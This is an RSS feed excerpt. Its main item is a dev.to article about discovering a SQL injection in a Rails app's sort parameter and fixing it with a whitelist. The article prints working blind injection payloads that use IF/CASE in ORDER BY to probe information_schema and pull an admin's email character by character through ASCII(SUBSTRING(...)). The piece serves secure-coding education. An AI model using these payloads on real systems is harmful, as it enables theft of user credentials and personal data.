&lt;li&gt;Padrão Builder - &lt;a href="https://bit.ly/3AiNfH0"&gt;https://bit.ly/3AiNfH0&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Artigo do criador do JILT - &lt;a href="https://bit.ly/3x7YKPS"&gt;https://bit.ly/3x7YKPS&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#livros"&gt;
  &lt;/a&gt;
  Livros
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Código limpo (Clean code de Robert C. Martin) - &lt;a href="https://amzn.to/3jzA8vh"&gt;https://amzn.to/3jzA8vh&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Java Efetivo (Effective Java de Joshua Bloch) - &lt;a href="https://amzn.to/3yeSd67"&gt;https://amzn.to/3yeSd67&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Padrões de Projetos: Soluções Reutilizáveis de Software Orientados a Objetos(&lt;em&gt;Design Patterns: Elements of Reusable Object-Oriented Software&lt;/em&gt; de GOF) - &lt;a href="https://amzn.to/3h99Sq9"&gt;https://amzn.to/3h99Sq9&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>java</category>
      <category>codequality</category>
    </item>
    <item>
      <title>Security vulnerabilities – how to find and fix them</title>
      <author>Nikita Pupko</author>
      <pubDate>Fri, 02 Jul 2021 14:17:41 +0000</pubDate>
      <link>https://dev.to/datarockets/security-vulnerabilities-how-to-find-and-fix-them-18m7</link>
      <guid>https://dev.to/datarockets/security-vulnerabilities-how-to-find-and-fix-them-18m7</guid>
      <description>&lt;p&gt;This article is about &lt;a href="https://datarockets.com/blog/code/sql-injection-security-vulnerability/"&gt;security vulnerabilities&lt;/a&gt; that can be found in many projects. Ignoring them can have terrible consequences for businesses. Hopefully, they are easy to fix. Here I described how I found a vulnerability, showed how it could be used for data extracting from the database, and fixed it with just one line of code.&lt;/p&gt;

&lt;p&gt;During one of my tasks on the project, I worked on Dashboard improvements. Dashboard – it’s just the main page for users with different types of entities (showed by cards) and filters in the sidebar (search by keyword, order, filter by type).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--GS6ceTHh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--GS6ceTHh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post.png" alt=""&gt;&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;Here is the HTML code of the &lt;code&gt;Sort&lt;/code&gt; filter.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;select&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"order_filter"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"order_filter"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control custom-select"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;option&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"last_seen desc"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Recent First&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;option&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"created desc"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Date Created ⬇&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;option&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"created asc"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Date Created ⬆&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;option&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"title asc"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;A-Z&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;option&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"title desc"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Z-A&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/select&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Field name for ordering and order in one place with space between. Put your first thought that came to your mind in the comments. 😄&lt;/p&gt;

&lt;p&gt;My first thought was, “Why does &lt;code&gt;value&lt;/code&gt; look pretty similar to the SQL request part?”. I decided to take a deeper look into it and found that we definitely pass it as:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="n"&gt;scope&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scope&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;filter_results&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;keyword: &lt;/span&gt;&lt;span class="vi"&gt;@keyword&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;state_filter: &lt;/span&gt;&lt;span class="vi"&gt;@state_filter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;order_filter: &lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:order_filter&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;where &lt;code&gt;filter_results&lt;/code&gt; is just a concern method that calls &lt;code&gt;state_filter&lt;/code&gt; and &lt;code&gt;order_filter&lt;/code&gt; on model if it exists.&lt;/p&gt;

&lt;p&gt;So, in model we just have this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="n"&gt;scope&lt;/span&gt; &lt;span class="ss"&gt;:keyword&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keyword&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"title like ?"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"%&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;keyword&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;%"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;scope&lt;/span&gt; &lt;span class="ss"&gt;:state_filter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;state&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="ss"&gt;state: &lt;/span&gt;&lt;span class="n"&gt;state&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;scope&lt;/span&gt; &lt;span class="ss"&gt;:order_filter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;order_filter&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;reorder&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;order_filter&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;- IMPORTANT LINE&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;ActiveRecord::QueryMethods#reorder Replaces any existing order defined on the relation with the specified order. User.order(’email DESC’).reorder(‘id ASC’) # generated SQL has ‘ORDER BY id ASC’&lt;br&gt;
Source: &lt;a href="https://apidock.com/rails/ActiveRecord/QueryMethods/reorder"&gt;https://apidock.com/rails/ActiveRecord/QueryMethods/reorder&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hello! Let’s play with it a little. Firstly I decided to test the ability to pass different symbols into the query, and it works well.&lt;/p&gt;

&lt;p&gt;I changed one of the HTML filter options to different column names and symbols like brackets, and it works well. So, we have the hole. Let’s put our finger into it.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--AnEWk__H--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post-2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--AnEWk__H--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post-2.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So, how could it help us get some data from the table? We can do some condition and get the result which can be reflected in the order of the cards on the dashboard:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--j4tVci-u--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injection-post-3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--j4tVci-u--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injection-post-3.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Do you remember this game from Tarantino’s &lt;strong&gt;Inglorious Bastards&lt;/strong&gt; film? When guys put stickers with the name of some person onto their foreheads and trying to guess this person’s name by using only questions with answers “Yes” or “No.”&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--hVvq5x_6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post-4.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--hVvq5x_6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post-4.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Useful construction for &lt;code&gt;ORDER&lt;/code&gt; SQL injection is a:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight sql"&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;CASE&lt;/span&gt; &lt;span class="k"&gt;WHEN&lt;/span&gt; &lt;span class="n"&gt;condition&lt;/span&gt; &lt;span class="k"&gt;THEN&lt;/span&gt; &lt;span class="n"&gt;first_coumn_name&lt;/span&gt; &lt;span class="k"&gt;ELSE&lt;/span&gt; &lt;span class="n"&gt;second_column_name&lt;/span&gt; &lt;span class="k"&gt;END&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;or&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight sql"&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;IF&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;condition&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;first_column_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;second_column_name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We just need to find a &lt;code&gt;condition&lt;/code&gt; (as a question), and two column names to see the result and put it as &lt;code&gt;ORDER BY&lt;/code&gt; value (like &lt;code&gt;Yes&lt;/code&gt; and &lt;code&gt;No&lt;/code&gt; answers).&lt;/p&gt;

&lt;p&gt;What could we put into the &lt;code&gt;condition&lt;/code&gt; part? Everything. Literally everything.&lt;/p&gt;

&lt;p&gt;How about this?&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight sql"&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;IF&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="k"&gt;count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt; 
&lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;COLUMN_NAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'is_admin'&lt;/span&gt; &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="k"&gt;table_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'users'&lt;/span&gt; &lt;span class="k"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'YES'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'NO'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If we have &lt;code&gt;is_admin&lt;/code&gt; column in &lt;code&gt;users&lt;/code&gt; table it should return &lt;code&gt;YES&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s put in into query with column names for sorting:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight sql"&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;IF&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="k"&gt;count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt; 
&lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;COLUMN_NAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'admin'&lt;/span&gt; &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="k"&gt;table_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'users'&lt;/span&gt; &lt;span class="k"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;created_at&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--S-TluD6_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post-5.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--S-TluD6_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post-5.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The first card is Fundico, and the second is Area. There is no &lt;code&gt;is_admin&lt;/code&gt; column in the users table. Let’s try just &lt;code&gt;admin&lt;/code&gt; instead:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HZIcAqJY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post-6.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HZIcAqJY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post-6.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we go! Now we know that we have &lt;code&gt;admin&lt;/code&gt; column in our &lt;code&gt;users&lt;/code&gt; table.&lt;/p&gt;

&lt;p&gt;P.S. The full query with injected code looks like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight sql"&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="nv"&gt;`table_1`&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="nv"&gt;`table_1`&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="nv"&gt;`table_1`&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;`id`&lt;/span&gt; &lt;span class="k"&gt;IN&lt;/span&gt; 
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="k"&gt;DISTINCT&lt;/span&gt; &lt;span class="nv"&gt;`table_2`&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;`deal_id`&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="nv"&gt;`table_2`&lt;/span&gt; &lt;span class="k"&gt;LEFT&lt;/span&gt; &lt;span class="k"&gt;OUTER&lt;/span&gt; &lt;span class="k"&gt;JOIN&lt;/span&gt; &lt;span class="nv"&gt;`team_members`&lt;/span&gt; 
    &lt;span class="k"&gt;ON&lt;/span&gt; &lt;span class="nv"&gt;`team_members`&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;`cool_dude_id`&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;`table_2`&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;`id`&lt;/span&gt; 
    &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="nv"&gt;`table_2`&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;`state`&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table_2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="o"&gt;=***&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="n"&gt;team_members&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="o"&gt;=***&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; 
  &lt;span class="k"&gt;ORDER&lt;/span&gt; &lt;span class="k"&gt;BY&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;IF&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="k"&gt;count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;information_schema&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt; 
    &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;COLUMN_NAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'admin'&lt;/span&gt; &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="k"&gt;table_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'users'&lt;/span&gt; &lt;span class="k"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;created_at&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Let’s find the rest of the data by analogy. Firstly we need to find &lt;code&gt;email&lt;/code&gt; of any admin user to get access to the system.&lt;/p&gt;

&lt;p&gt;We could do this symbol by symbol using ASCII table:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Hc9Cuwnj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post-7.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Hc9Cuwnj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://datarockets.com/wp-content/uploads/2021/06/SQL-injections-post-7.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We just need to paste all symbols one by one and look for a match:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight sql"&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;IF&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SUBSTRING&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="k"&gt;where&lt;/span&gt; &lt;span class="k"&gt;admin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt; &lt;span class="k"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;105&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;created_at&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This query returns true if the first ASCII code of symbol in the &lt;code&gt;email&lt;/code&gt; of the first admin equals &lt;code&gt;105&lt;/code&gt; (I.e., the first symbol of email is &lt;code&gt;i&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Then we go for the second symbol using &lt;code&gt;ASCII(SUBSTRING(email, 2, 1))&lt;/code&gt; and find all symbols one by one.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;We could find any information using this hole like credentials of all users, phones, addresses, etc. Always be careful and try not to use strings for searches and filters in Rails.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Rails is well enough protected from vulnerabilities, but nothing can save you from your own mistakes.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Use wrappers, like hashes and arrays. Don’t use &lt;code&gt;User.where(“name = ‘#{params[:name]'”)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Use &lt;code&gt;User.where([“name = ?”, “#{params[:name]}”])&lt;/code&gt; or &lt;code&gt;User.where({ name: params[:name] })&lt;/code&gt; instead.&lt;/p&gt;

&lt;p&gt;This vulnerability can be fixed using just one line, for example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ruby"&gt;&lt;code&gt;&lt;span class="no"&gt;ORDER_FILTERS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="ss"&gt;title_asc: &lt;/span&gt;&lt;span class="s1"&gt;'title asc'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;created_at_asc: &lt;/span&gt;&lt;span class="s1"&gt;'created_at asc'&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;scope&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scope&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;filter_results&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;order_filter: &lt;/span&gt;&lt;span class="no"&gt;ORDER_FILTERS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:order_filter&lt;/span&gt;&lt;span class="p"&gt;]])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>sql</category>
      <category>ruby</category>
      <category>rails</category>
    </item>
  </channel>
</rss>
